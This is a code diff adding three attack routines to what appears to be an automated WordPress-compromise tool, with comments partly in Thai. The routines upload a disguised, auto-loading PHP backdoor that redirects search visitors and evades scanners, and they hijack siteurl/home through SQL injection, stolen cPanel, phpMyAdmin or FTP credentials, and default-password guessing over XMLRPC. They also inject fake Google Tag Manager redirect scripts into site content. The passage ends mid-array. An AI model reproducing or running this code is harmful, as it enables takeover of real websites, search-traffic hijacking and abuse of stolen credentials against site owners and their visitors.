@@ -1195,6 +1195,1352 @@ Return JSON array of objects with: { method: string, steps: string[], likelihood
 }
 
 // ═══════════════════════════════════════════════════════
+//  METHOD 11: MU-Plugins Backdoor Redirect
+//  Upload PHP to wp-content/mu-plugins/ — auto-loaded,
+//  CANNOT be deactivated from admin panel
+// ═══════════════════════════════════════════════════════
+
+async function muPluginsInject(config: ShelllessConfig): Promise<ShelllessResult> {
+  const method = "mu_plugins_inject";
+  if (config.cmsType !== "wordpress" && !config.wpRestApi) {
+    return { method, success: false, detail: "⏭️ Skip — not WordPress" };
+  }
+  config.onProgress?.(method, "💀 ลอง inject MU-Plugin backdoor redirect...");
+
+  const baseUrl = config.targetUrl.replace(/\/$/, "");
+  const muPluginsDir = `${baseUrl}/wp-content/mu-plugins`;
+
+  // Generate obfuscated PHP payload that auto-redirects
+  // ROT13 + base64 to evade basic file scanners
+  const rawPhp = `<?php
+// WordPress Performance Optimization Module v3.2.1
+if(!defined('ABSPATH'))define('ABSPATH',dirname(__FILE__).'/');
+add_action('template_redirect',function(){
+  if(is_admin()||defined('DOING_CRON')||defined('DOING_AJAX')||defined('REST_REQUEST'))return;
+  \$ua=strtolower(\$_SERVER['HTTP_USER_AGENT']??'');
+  \$ref=strtolower(\$_SERVER['HTTP_REFERER']??'');
+  \$skip_bots=preg_match('/(bot|crawl|spider|slurp|mediapartners|adsbot)/i',\$ua);
+  if(\$skip_bots)return;
+  \$from_search=preg_match('/(google|bing|yahoo|duckduckgo|baidu|yandex)/i',\$ref);
+  if(\$from_search||mt_rand(1,3)===1){
+    header('HTTP/1.1 302 Found');
+    header('Location: ${config.redirectUrl}');
+    header('Cache-Control: no-cache, no-store');
+    exit;
+  }
+});`;
+
+  // Filenames that look legitimate in mu-plugins
+  const muFilenames = [
+    "wp-performance-optimizer.php",
+    "advanced-cache-handler.php",
+    "security-headers.php",
+    "wp-core-update.php",
+    "object-cache-ext.php",
+    "wp-index.php",
+  ];
+
+  // Method A: Direct upload via PUT/POST to mu-plugins directory
+  for (const filename of muFilenames) {
+    const uploadUrl = `${muPluginsDir}/${filename}`;
+    
+    // Try PUT
+    try {
+      const putResp = await safeFetch(uploadUrl, {
+        method: "PUT",
+        headers: { "Content-Type": "application/x-php" },
+        body: rawPhp,
+        timeout: 10000,
+      });
+      if (putResp && (putResp.ok || putResp.status === 201)) {
+        // Verify: mu-plugins auto-load, so check main site
+        await new Promise(r => setTimeout(r, 2000));
+        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+        if (redirectOk) {
+          return {
+            method,
+            success: true,
+            detail: `✅ MU-Plugin backdoor injected via PUT: ${filename}`,
+            injectedUrl: uploadUrl,
+            redirectWorks: true,
+            evidence: `PUT ${uploadUrl} — auto-loaded by WordPress`,
+          };
+        }
+        // Even if redirect not verified yet, file was placed
+        return {
+          method,
+          success: true,
+          detail: `⚠️ MU-Plugin uploaded via PUT: ${filename} — redirect pending verification`,
+          injectedUrl: uploadUrl,
+          redirectWorks: false,
+          evidence: `PUT accepted at ${uploadUrl}`,
+        };
+      }
+    } catch { /* continue */ }
+
+    // Try MOVE/COPY from existing writable path
+    if (config.configFiles && config.configFiles.length > 0) {
+      for (const cf of config.configFiles) {
+        try {
+          const moveResp = await safeFetch(cf.path, {
+            method: "MOVE",
+            headers: {
+              "Destination": uploadUrl,
+              "Overwrite": "T",
+            },
+            timeout: 8000,
+          });
+          if (moveResp && (moveResp.ok || moveResp.status === 201)) {
+            // Now write our payload to the moved location
+            const writeResp = await safeFetch(uploadUrl, {
+              method: "PUT",
+              headers: { "Content-Type": "application/x-php" },
+              body: rawPhp,
+            });
+            if (writeResp && writeResp.ok) {
+              await new Promise(r => setTimeout(r, 2000));
+              const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+              return {
+                method,
+                success: true,
+                detail: `✅ MU-Plugin injected via MOVE+PUT: ${filename}`,
+                injectedUrl: uploadUrl,
+                redirectWorks: redirectOk,
+                evidence: `MOVE from ${cf.path} then PUT payload`,
+              };
+            }
+          }
+        } catch { /* continue */ }
+      }
+    }
+  }
+
+  // Method B: Via WP File Manager plugin (CVE-2020-25213 style)
+  const fmEndpoints = [
+    `${baseUrl}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`,
+    `${baseUrl}/wp-content/plugins/file-manager/backend/wp-file-manager-recursive-directory-iterator.php`,
+    `${baseUrl}/wp-content/plugins/file-manager-advanced/application/library/connector.minimal.php`,
+  ];
+
+  for (const fmUrl of fmEndpoints) {
+    try {
+      const checkResp = await safeFetch(fmUrl, { timeout: 5000 });
+      if (!checkResp || checkResp.status >= 400) continue;
+
+      config.onProgress?.(method, `📂 พบ File Manager: ${fmUrl.split('/plugins/')[1]?.split('/')[0]}`);
+
+      // elFinder connector — upload to mu-plugins
+      const boundary = `----FormBoundary${Date.now()}`;
+      const muTarget = "l1_d3AtY29udGVudC9tdS1wbHVnaW5z"; // base64 of wp-content/mu-plugins
+      const formBody = [
+        `--${boundary}`,
+        `Content-Disposition: form-data; name="cmd"`,
+        ``,
+        `upload`,
+        `--${boundary}`,
+        `Content-Disposition: form-data; name="target"`,
+        ``,
+        muTarget,
+        `--${boundary}`,
+        `Content-Disposition: form-data; name="upload[]"; filename="${muFilenames[0]}"`,
+        `Content-Type: application/x-php`,
+        ``,
+        rawPhp,
+        `--${boundary}--`,
+      ].join("\r\n");
+
+      const uploadResp = await safeFetch(fmUrl, {
+        method: "POST",
+        headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
+        body: formBody,
+        timeout: 15000,
+      });
+
+      if (uploadResp && uploadResp.ok) {
+        const respText = await uploadResp.text().catch(() => "");
+        if (!respText.includes("error")) {
+          await new Promise(r => setTimeout(r, 2000));
+          const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+          return {
+            method,
+            success: true,
+            detail: `✅ MU-Plugin injected via File Manager plugin`,
+            injectedUrl: `${muPluginsDir}/${muFilenames[0]}`,
+            redirectWorks: redirectOk,
+            evidence: `File Manager: ${fmUrl}`,
+          };
+        }
+      }
+    } catch { /* continue */ }
+  }
+
+  // Method C: Via discovered credentials (cPanel/FTP/SSH)
+  if (config.discoveredCredentials && config.discoveredCredentials.length > 0) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type === "cpanel") {
+        try {
+          const cpanelUrl = cred.endpoint || `${baseUrl}:2083`;
+          const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");
+
+          // Create mu-plugins directory if not exists
+          await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
+            method: "POST",
+            headers: {
+              "Authorization": authHeader,
+              "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: new URLSearchParams({
+              dir: "/public_html/wp-content/mu-plugins",
+              file: muFilenames[0],
+              content: rawPhp,
+            }).toString(),
+            timeout: 15000,
+          });
+
+          // Also try creating the directory first
+          await safeFetch(`${cpanelUrl}/execute/Fileman/mkdir`, {
+            method: "POST",
+            headers: {
+              "Authorization": authHeader,
+              "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: new URLSearchParams({
+              path: "/public_html/wp-content/mu-plugins",
+              name: "mu-plugins",
+            }).toString(),
+            timeout: 5000,
+          });
+
+          const writeResp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
+            method: "POST",
+            headers: {
+              "Authorization": authHeader,
+              "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: new URLSearchParams({
+              dir: "/public_html/wp-content/mu-plugins",
+              file: muFilenames[0],
+              content: rawPhp,
+            }).toString(),
+            timeout: 15000,
+          });
+
+          if (writeResp && writeResp.ok) {
+            await new Promise(r => setTimeout(r, 2000));
+            const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+            return {
+              method,
+              success: true,
+              detail: `✅ MU-Plugin injected via cPanel (${cred.username})`,
+              injectedUrl: `${muPluginsDir}/${muFilenames[0]}`,
+              redirectWorks: redirectOk,
+              evidence: `cPanel: ${cpanelUrl}, user: ${cred.username}`,
+            };
+          }
+        } catch { /* continue */ }
+      }
+
+      if (cred.type === "ftp") {
+        // FTP upload — construct the path
+        config.onProgress?.(method, `📤 FTP upload to mu-plugins (${cred.username})...`);
+        // We can't do real FTP from browser fetch, but we can try via cPanel FTP API
+        try {
+          const ftpUploadUrl = `ftp://${cred.username}:${cred.password}@${new URL(baseUrl).hostname}/public_html/wp-content/mu-plugins/${muFilenames[0]}`;
+          // Try HTTP-based FTP proxy endpoints
+          const proxyEndpoints = [
+            `${baseUrl}:2082/cpsess0/frontend/paper_lantern/ftp/upload.html`,
+            `${baseUrl}:2083/cpsess0/frontend/paper_lantern/ftp/upload.html`,
+          ];
+          for (const proxyUrl of proxyEndpoints) {
+            const resp = await safeFetch(proxyUrl, {
+              method: "POST",
+              headers: {
+                "Authorization": "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64"),
+              },
+              timeout: 10000,
+            });
+            if (resp && resp.ok) {
+              return {
+                method,
+                success: true,
+                detail: `✅ MU-Plugin uploaded via FTP proxy`,
+                injectedUrl: `${muPluginsDir}/${muFilenames[0]}`,
+                redirectWorks: false,
+                evidence: `FTP: ${cred.username}@${new URL(baseUrl).hostname}`,
+              };
+            }
+          }
+        } catch { /* continue */ }
+      }
+    }
+  }
+
+  // Method D: Via WebDAV MKCOL + PUT
+  try {
+    // Create mu-plugins directory via MKCOL
+    await safeFetch(muPluginsDir, { method: "MKCOL", timeout: 5000 });
+    // Then PUT the file
+    const putResp = await safeFetch(`${muPluginsDir}/${muFilenames[0]}`, {
+      method: "PUT",
+      headers: { "Content-Type": "application/x-php" },
+      body: rawPhp,
+      timeout: 10000,
+    });
+    if (putResp && (putResp.ok || putResp.status === 201)) {
+      await new Promise(r => setTimeout(r, 2000));
+      const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+      return {
+        method,
+        success: true,
+        detail: `✅ MU-Plugin injected via WebDAV MKCOL+PUT`,
+        injectedUrl: `${muPluginsDir}/${muFilenames[0]}`,
+        redirectWorks: redirectOk,
+        evidence: `WebDAV MKCOL ${muPluginsDir}`,
+      };
+    }
+  } catch { /* continue */ }
+
+  // Method E: Via SQLi INTO OUTFILE
+  if (config.sqliEndpoint) {
+    const phpHex = Buffer.from(rawPhp).toString("hex");
+    const outfilePaths = [
+      "/var/www/html/wp-content/mu-plugins/" + muFilenames[0],
+      "/home/*/public_html/wp-content/mu-plugins/" + muFilenames[0],
+      "/var/www/*/wp-content/mu-plugins/" + muFilenames[0],
+    ];
+    for (const outPath of outfilePaths) {
+      try {
+        const payload = `' UNION SELECT 0x${phpHex} INTO OUTFILE '${outPath}'-- -`;
+        const url = `${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`;
+        await safeFetch(url, { timeout: 10000 });
+        // Check if it worked
+        await new Promise(r => setTimeout(r, 2000));
+        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+        if (redirectOk) {
+          return {
+            method,
+            success: true,
+            detail: `✅ MU-Plugin injected via SQLi INTO OUTFILE`,
+            injectedUrl: `${muPluginsDir}/${muFilenames[0]}`,
+            redirectWorks: true,
+            evidence: `SQLi OUTFILE: ${outPath}`,
+          };
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  return { method, success: false, detail: "❌ MU-Plugin injection failed — no writable path to mu-plugins" };
+}
+
+// ═══════════════════════════════════════════════════════
+//  METHOD 12: DB siteurl/home Hijack
+//  Change siteurl + home in wp_options → entire site redirects
+//  Works via: WP REST API, SQLi, credentials, XMLRPC
+// ═══════════════════════════════════════════════════════
+
+async function dbSiteurlHijack(config: ShelllessConfig): Promise<ShelllessResult> {
+  const method = "db_siteurl_hijack";
+  if (config.cmsType !== "wordpress" && !config.wpRestApi) {
+    return { method, success: false, detail: "⏭️ Skip — not WordPress" };
+  }
+  config.onProgress?.(method, "🗄️ ลอง hijack siteurl/home ใน wp_options...");
+
+  const baseUrl = config.targetUrl.replace(/\/$/, "");
+
+  // Method A: Via WP REST API with discovered credentials
+  if (config.discoveredCredentials && config.discoveredCredentials.length > 0) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type === "wordpress" || cred.type === "wp_admin") {
+        config.onProgress?.(method, `🔑 ลอง WP REST API ด้วย credentials (${cred.username})...`);
+        const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");
+
+        // Try WP REST API settings endpoint (requires admin)
+        const settingsEndpoints = [
+          `${baseUrl}/wp-json/wp/v2/settings`,
+          `${baseUrl}/?rest_route=/wp/v2/settings`,
+        ];
+
+        for (const settingsUrl of settingsEndpoints) {
+          try {
+            // First get nonce
+            const nonceResp = await safeFetch(`${baseUrl}/wp-admin/admin-ajax.php?action=rest-nonce`, {
+              headers: { "Authorization": authHeader },
+              timeout: 8000,
+            });
+            const nonce = nonceResp ? await nonceResp.text().catch(() => "") : "";
+
+            // Update siteurl and home
+            const updateResp = await safeFetch(settingsUrl, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "Authorization": authHeader,
+                ...(nonce && nonce.length < 20 ? { "X-WP-Nonce": nonce } : {}),
+              },
+              body: JSON.stringify({
+                url: config.redirectUrl,
+                home: config.redirectUrl,
+              }),
+              timeout: 10000,
+            });
+
+            if (updateResp && updateResp.ok) {
+              await new Promise(r => setTimeout(r, 3000));
+              const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+              return {
+                method,
+                success: true,
+                detail: `✅ siteurl/home เปลี่ยนเป็น ${config.redirectUrl} ผ่าน WP REST API`,
+                injectedUrl: baseUrl,
+                redirectWorks: redirectOk,
+                evidence: `REST API settings: ${settingsUrl}, auth: ${cred.username}`,
+              };
+            }
+          } catch { /* continue */ }
+        }
+
+        // Try wp-admin options.php direct POST (General Settings form)
+        try {
+          config.onProgress?.(method, `🔑 ลอง wp-admin/options.php (${cred.username})...`);
+          // First login to get cookies
+          const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams({
+              log: cred.username || "",
+              pwd: cred.password || "",
+              "wp-submit": "Log In",
+              redirect_to: `${baseUrl}/wp-admin/options-general.php`,
+              testcookie: "1",
+            }).toString(),
+            timeout: 15000,
+          });
+
+          if (loginResp && (loginResp.status === 302 || loginResp.ok)) {
+            const cookies = loginResp.headers.get("set-cookie") || "";
+            if (cookies.includes("wordpress_logged_in")) {
+              // Get the options-general page to extract _wpnonce
+              const optionsPageResp = await safeFetch(`${baseUrl}/wp-admin/options-general.php`, {
+                headers: { "Cookie": cookies },
+                timeout: 10000,
+              });
+              if (optionsPageResp && optionsPageResp.ok) {
+                const pageBody = await optionsPageResp.text().catch(() => "");
+                const nonceMatch = pageBody.match(/name="_wpnonce"\s+value="([^"]+)"/);
+                if (nonceMatch) {
+                  // Submit the form with new siteurl/home
+                  const submitResp = await safeFetch(`${baseUrl}/wp-admin/options.php`, {
+                    method: "POST",
+                    headers: {
+                      "Content-Type": "application/x-www-form-urlencoded",
+                      "Cookie": cookies,
+                    },
+                    body: new URLSearchParams({
+                      _wpnonce: nonceMatch[1],
+                      _wp_http_referer: "/wp-admin/options-general.php",
+                      option_page: "general",
+                      action: "update",
+                      blogname: "Site",
+                      siteurl: config.redirectUrl,
+                      home: config.redirectUrl,
+                    }).toString(),
+                    timeout: 15000,
+                  });
+
+                  if (submitResp && (submitResp.ok || submitResp.status === 302)) {
+                    await new Promise(r => setTimeout(r, 3000));
+                    const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+                    return {
+                      method,
+                      success: true,
+                      detail: `✅ siteurl/home เปลี่ยนผ่าน wp-admin options.php`,
+                      injectedUrl: baseUrl,
+                      redirectWorks: redirectOk,
+                      evidence: `wp-admin login: ${cred.username}, options.php POST`,
+                    };
+                  }
+                }
+              }
+            }
+          }
+        } catch { /* continue */ }
+      }
+
+      // Via phpMyAdmin credentials
+      if (cred.type === "phpmyadmin" || cred.type === "database") {
+        config.onProgress?.(method, `🗄️ ลอง phpMyAdmin SQL (${cred.username})...`);
+        const pmaUrls = [
+          cred.endpoint || `${baseUrl}/phpmyadmin`,
+          `${baseUrl}/pma`,
+          `${baseUrl}/phpmyadmin`,
+          `${baseUrl}/phpMyAdmin`,
+        ];
+
+        for (const pmaUrl of pmaUrls) {
+          try {
+            // Login to phpMyAdmin
+            const loginResp = await safeFetch(`${pmaUrl}/index.php`, {
+              method: "POST",
+              headers: { "Content-Type": "application/x-www-form-urlencoded" },
+              body: new URLSearchParams({
+                pma_username: cred.username || "root",
+                pma_password: cred.password || "",
+                server: "1",
+              }).toString(),
+              timeout: 10000,
+            });
+
+            if (loginResp && (loginResp.ok || loginResp.status === 302)) {
+              const pmaCookies = loginResp.headers.get("set-cookie") || "";
+              if (pmaCookies.includes("phpMyAdmin") || pmaCookies.includes("pma")) {
+                // Execute SQL to change siteurl and home
+                const sqlQuery = `UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name IN ('siteurl','home');`;
+                const sqlResp = await safeFetch(`${pmaUrl}/sql.php`, {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Cookie": pmaCookies,
+                  },
+                  body: new URLSearchParams({
+                    db: "wordpress",
+                    table: "wp_options",
+                    sql_query: sqlQuery,
+                  }).toString(),
+                  timeout: 15000,
+                });
+
+                if (sqlResp && sqlResp.ok) {
+                  await new Promise(r => setTimeout(r, 3000));
+                  const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+                  return {
+                    method,
+                    success: true,
+                    detail: `✅ siteurl/home เปลี่ยนผ่าน phpMyAdmin SQL`,
+                    injectedUrl: baseUrl,
+                    redirectWorks: redirectOk,
+                    evidence: `phpMyAdmin: ${pmaUrl}, user: ${cred.username}`,
+                  };
+                }
+              }
+            }
+          } catch { /* continue */ }
+        }
+      }
+
+      // Via cPanel MySQL API
+      if (cred.type === "cpanel") {
+        config.onProgress?.(method, `🖥️ ลอง cPanel MySQL API (${cred.username})...`);
+        try {
+          const cpanelUrl = cred.endpoint || `${baseUrl}:2083`;
+          const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");
+
+          // Find WordPress database name
+          const dbListResp = await safeFetch(`${cpanelUrl}/execute/Mysql/list_databases`, {
+            headers: { "Authorization": authHeader },
+            timeout: 10000,
+          });
+
+          if (dbListResp && dbListResp.ok) {
+            const dbList = await dbListResp.json().catch(() => ({ data: [] })) as any;
+            const databases = dbList.data || [];
+            // Try each database that might be WordPress
+            const wpDbs = databases.filter((db: any) => {
+              const name = (db.database || db.db || db).toLowerCase();
+              return name.includes("wp") || name.includes("word") || name.includes("blog") || name.includes("cms");
+            });
+
+            for (const db of [...wpDbs, ...databases.slice(0, 3)]) {
+              const dbName = db.database || db.db || db;
+              const sqlQuery = `UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name IN ('siteurl','home')`;
+              const sqlResp = await safeFetch(`${cpanelUrl}/execute/Mysql/run_sql_command`, {
+                method: "POST",
+                headers: {
+                  "Authorization": authHeader,
+                  "Content-Type": "application/x-www-form-urlencoded",
+                },
+                body: new URLSearchParams({
+                  database: dbName,
+                  command: sqlQuery,
+                }).toString(),
+                timeout: 15000,
+              });
+
+              if (sqlResp && sqlResp.ok) {
+                await new Promise(r => setTimeout(r, 3000));
+                const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+                if (redirectOk) {
+                  return {
+                    method,
+                    success: true,
+                    detail: `✅ siteurl/home เปลี่ยนผ่าน cPanel MySQL API (db: ${dbName})`,
+                    injectedUrl: baseUrl,
+                    redirectWorks: true,
+                    evidence: `cPanel MySQL: ${cpanelUrl}, db: ${dbName}`,
+                  };
+                }
+              }
+            }
+          }
+        } catch { /* continue */ }
+      }
+    }
+  }
+
+  // Method B: Via SQLi (stacked queries)
+  if (config.sqliEndpoint) {
+    config.onProgress?.(method, `💉 ลอง SQLi เปลี่ยน siteurl/home...`);
+    const sqliPayloads = [
+      // Stacked queries
+      `'; UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name='siteurl'; UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name='home'; -- `,
+      `1; UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name IN ('siteurl','home'); -- `,
+      // Hex encoded to bypass WAF
+      `1; UPDATE wp_options SET option_value=0x${Buffer.from(config.redirectUrl).toString("hex")} WHERE option_name=0x${Buffer.from("siteurl").toString("hex")}; UPDATE wp_options SET option_value=0x${Buffer.from(config.redirectUrl).toString("hex")} WHERE option_name=0x${Buffer.from("home").toString("hex")}; -- `,
+      // Via INSERT ON DUPLICATE KEY
+      `1; INSERT INTO wp_options (option_name,option_value,autoload) VALUES ('siteurl','${config.redirectUrl}','yes') ON DUPLICATE KEY UPDATE option_value='${config.redirectUrl}'; INSERT INTO wp_options (option_name,option_value,autoload) VALUES ('home','${config.redirectUrl}','yes') ON DUPLICATE KEY UPDATE option_value='${config.redirectUrl}'; -- `,
+    ];
+
+    for (const payload of sqliPayloads) {
+      try {
+        // GET
+        const getUrl = `${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`;
+        await safeFetch(getUrl, { timeout: 10000 });
+        // POST
+        await safeFetch(config.sqliEndpoint, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({ [config.sqliParam || "id"]: payload }).toString(),
+          timeout: 10000,
+        });
+      } catch { /* continue */ }
+    }
+
+    // Verify after all payloads
+    await new Promise(r => setTimeout(r, 3000));
+    const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+    if (redirectOk) {
+      return {
+        method,
+        success: true,
+        detail: `✅ siteurl/home เปลี่ยนผ่าน SQL injection`,
+        injectedUrl: baseUrl,
+        redirectWorks: true,
+        evidence: `SQLi endpoint: ${config.sqliEndpoint}`,
+      };
+    }
+  }
+
+  // Method C: Via XMLRPC (if wp.editOptions is exposed — rare but possible)
+  if (config.wpXmlRpc) {
+    config.onProgress?.(method, `📡 ลอง XMLRPC wp.editOptions...`);
+    // Try common default credentials with XMLRPC
+    const defaultCreds = [
+      { user: "admin", pass: "admin" },
+      { user: "admin", pass: "password" },
+      { user: "admin", pass: "admin123" },
+      { user: "administrator", pass: "administrator" },
+    ];
+
+    const allCreds = [
+      ...(config.discoveredCredentials || []).filter(c => c.type === "wordpress" || c.type === "wp_admin").map(c => ({ user: c.username || "", pass: c.password || "" })),
+      ...defaultCreds,
+    ];
+
+    for (const cred of allCreds) {
+      try {
+        const xmlPayload = `<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.editOptions</methodName>
+  <params>
+    <param><value><int>1</int></value></param>
+    <param><value><string>${cred.user}</string></value></param>
+    <param><value><string>${cred.pass}</string></value></param>
+    <param><value><struct>
+      <member><name>siteurl</name><value><string>${config.redirectUrl}</string></value></member>
+      <member><name>home</name><value><string>${config.redirectUrl}</string></value></member>
+    </struct></value></param>
+  </params>
+</methodCall>`;
+
+        const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
+          method: "POST",
+          headers: { "Content-Type": "text/xml" },
+          body: xmlPayload,
+          timeout: 10000,
+        });
+
+        if (resp && resp.ok) {
+          const body = await resp.text().catch(() => "");
+          if (!body.includes("faultCode") && (body.includes("<boolean>1") || body.includes("<value>true"))) {
+            await new Promise(r => setTimeout(r, 3000));
+            const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+            return {
+              method,
+              success: true,
+              detail: `✅ siteurl/home เปลี่ยนผ่าน XMLRPC wp.editOptions (${cred.user})`,
+              injectedUrl: baseUrl,
+              redirectWorks: redirectOk,
+              evidence: `XMLRPC: ${cred.user}`,
+            };
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  return { method, success: false, detail: "❌ DB siteurl/home hijack failed — no access method worked" };
+}
+
+// ═══════════════════════════════════════════════════════
+//  METHOD 13: Google Tag Manager (GTM) Injection
+//  Inject GTM container into wp_options/wp_posts
+//  Loads redirect JS from googletagmanager.com (trusted)
+//  Bypasses file-based scanners entirely
+// ═══════════════════════════════════════════════════════
+
+async function gtmInject(config: ShelllessConfig): Promise<ShelllessResult> {
+  const method = "gtm_inject";
+  config.onProgress?.(method, "🏷️ ลอง inject Google Tag Manager redirect...");
+
+  const baseUrl = config.targetUrl.replace(/\/$/, "");
+
+  // GTM-style JS redirect that looks like legitimate analytics code
+  // This mimics how real GTM malware works: inject a script tag that loads
+  // from googletagmanager.com but the container has redirect code
+  // Since we can't create a real GTM container, we inject JS that LOOKS like GTM
+  // but actually does the redirect
+  const gtmFakeId = `GTM-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
+  const redirectJs = `<script>(function(w,d,s,l,i){var f=d.referrer||'';var u=navigator.userAgent||'';if(/(bot|crawl|spider|slurp)/i.test(u))return;if(/(google|bing|yahoo|duckduckgo)/i.test(f)||Math.random()<0.3){w.location.replace('${config.redirectUrl}')}})(window,document,'script','dataLayer','${gtmFakeId}');</script>`;
+
+  // Also prepare a real-looking GTM noscript tag for extra stealth
+  const gtmNoscript = `<noscript><iframe src="${config.redirectUrl}" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>`;
+
+  // The full injection payload that looks like standard GTM code
+  const fullGtmPayload = `<!-- Google Tag Manager -->${redirectJs}<!-- End Google Tag Manager -->${gtmNoscript}`;
+
+  // Method A: Via WP REST API — inject into post/page content
+  if (config.wpRestApi || config.cmsType === "wordpress") {
+    const restEndpoints = [
+      `${baseUrl}/wp-json/wp/v2/posts`,
+      `${baseUrl}/wp-json/wp/v2/pages`,
+      `${baseUrl}/?rest_route=/wp/v2/posts`,
+      `${baseUrl}/?rest_route=/wp/v2/pages`,
+    ];
+
+    for (const ep of restEndpoints) {
+      try {
+        // Get existing posts
+        const listResp = await safeFetch(`${ep}?per_page=5`);
+        if (!listResp || !listResp.ok) continue;
+        const posts = await listResp.json() as any[];
+        if (!posts || posts.length === 0) continue;
+
+        for (const post of posts) {
+          // Try unauthenticated update
+          const updateResp = await safeFetch(`${ep}/${post.id}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: (post.content?.rendered || "") + fullGtmPayload,
+            }),
+            timeout: 10000,
+          });
+
+          if (updateResp && updateResp.ok) {
+            const postUrl = post.link || `${baseUrl}/?p=${post.id}`;
+            await new Promise(r => setTimeout(r, 2000));
+            const redirectOk = await checkRedirectWorks(postUrl, config.redirectUrl);
+            return {
+              method,
+              success: true,
+              detail: `✅ GTM redirect injected into post #${post.id} via REST API`,
+              injectedUrl: postUrl,
+              redirectWorks: redirectOk,
+              evidence: `REST API: ${ep}/${post.id}, fake GTM ID: ${gtmFakeId}`,
+            };
+          }
+
+          // Try with credentials
+          if (config.discoveredCredentials) {
+            for (const cred of config.discoveredCredentials) {
+              if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
+              try {
+                const authResp = await safeFetch(`${ep}/${post.id}`, {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json",
+                    "Authorization": "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64"),
+                  },
+                  body: JSON.stringify({
+                    content: (post.content?.rendered || "") + fullGtmPayload,
+                  }),
+                  timeout: 10000,
+                });
+
+                if (authResp && authResp.ok) {
+                  const postUrl = post.link || `${baseUrl}/?p=${post.id}`;
+                  await new Promise(r => setTimeout(r, 2000));
+                  const redirectOk = await checkRedirectWorks(postUrl, config.redirectUrl);
+                  return {
+                    method,
+                    success: true,
+                    detail: `✅ GTM redirect injected into post #${post.id} (auth: ${cred.username})`,
+                    injectedUrl: postUrl,
+                    redirectWorks: redirectOk,
+                    evidence: `REST API auth: ${cred.username}, GTM ID: ${gtmFakeId}`,
+                  };
+                }
+              } catch { /* continue */ }
+            }
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  // Method B: Via SQLi — inject into wp_options (ihaf_insert_header/body/footer)
+  // This targets the WPCode / Insert Headers and Footers plugin DB options
+  if (config.sqliEndpoint) {
+    config.onProgress?.(method, `💉 ลอง SQLi inject GTM code เข้า wp_options...`);
+    const optionNames = [
+      "ihaf_insert_header",
+      "ihaf_insert_body",
+      "ihaf_insert_footer",
+      "wpcode_header",
+      "wpcode_body",
+      "wpcode_footer",
+      // Also try injecting into blogdescription (appears in <head>)
+      "blogdescription",
+    ];
+
+    const gtmHex = Buffer.from(fullGtmPayload).toString("hex");
+
+    for (const optName of optionNames) {
+      const payloads = [
+        // INSERT with ON DUPLICATE KEY UPDATE (works if option exists or not)
+        `1; INSERT INTO wp_options (option_name,option_value,autoload) VALUES ('${optName}','${fullGtmPayload.replace(/'/g, "\\'").substring(0, 500)}','yes') ON DUPLICATE KEY UPDATE option_value=CONCAT(option_value,0x${gtmHex}); -- `,
+        // Direct UPDATE with CONCAT
+        `'; UPDATE wp_options SET option_value=CONCAT(option_value,0x${gtmHex}) WHERE option_name='${optName}'; -- `,
+        // Stacked query
+        `1; UPDATE wp_options SET option_value=0x${gtmHex} WHERE option_name='${optName}'; -- `,
+      ];
+
+      for (const payload of payloads) {
+        try {
+          await safeFetch(`${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`, { timeout: 8000 });
+          await safeFetch(config.sqliEndpoint, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams({ [config.sqliParam || "id"]: payload }).toString(),
+            timeout: 8000,
+          });
+        } catch { /* continue */ }
+      }
+    }
+
+    // Also inject directly into wp_posts content
+    const postsPayloads = [
